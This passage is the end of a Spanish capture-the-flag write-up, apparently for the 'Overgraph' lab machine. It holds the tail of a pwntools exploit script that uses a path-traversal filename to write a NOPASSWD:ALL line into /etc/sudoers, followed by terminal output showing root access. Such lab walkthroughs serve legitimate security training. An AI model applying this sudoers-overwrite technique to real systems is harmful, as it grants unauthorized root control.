<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message Title: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'ALL=NOPASSWD:ALL'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'user'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'3'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Enter number to edit: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'12'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Message Title: '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'pt/../etc/sudoers'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'4'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'2'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">close</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ls -l --time-style=+ /etc/sudoers  
-r--r----- 1 root root 755  /etc/sudoers
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ sudo -l
[sudo] password for user:
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">exploit_write.py</span> 127.0.0.1 9851
[<span class="code-blue">*</span>] './nreport_patched'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3fd000)</span>
    RUNPATH:  <span class="code-dark-red">b'./libc'</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 9851: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 9851
</code></pre></div><p>Y con esto, tenemos permisos de <code>sudo</code> sin proporcionar contraseña:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ ls -l --time-style=+ /etc/sudoers
-r--r----- 1 root root 777  /etc/sudoers
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ sudo -l
Matching Defaults entries for user on overgraph:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  

User user may run the following commands on overgraph:
    (root) NOPASSWD: ALL
<span class="code-green">user@overgraph</span>:<span class="code-blue">/usr/local/bin/Nreport</span>$ sudo su
root@overgraph:/usr/local/bin/Nreport# cat /root/root.txt
413a25bd4e358c7863dd13455c053247
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#registrando-una-nueva-cuenta">Registrando una nueva cuenta</a></li><li><a href="#encontrando-vulnerabilidades">Encontrando vulnerabilidades</a></li><li><a href="#enumeración-de-graphql">Enumeración de GraphQL</a></li><li><a href="#explotación-para-obtener-admintoken">Explotación para obtener <code>adminToken</code></a></li><li><a href="#explotación-de-la-subida-de-archivos-de-vídeo">Explotación de la subida de archivos de vídeo</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#analizando-el-binario-nreport">Analizando el binario <code>nreport</code></a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail">
<input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Submit"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="TinyLetter">TinyLetter</a></p><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>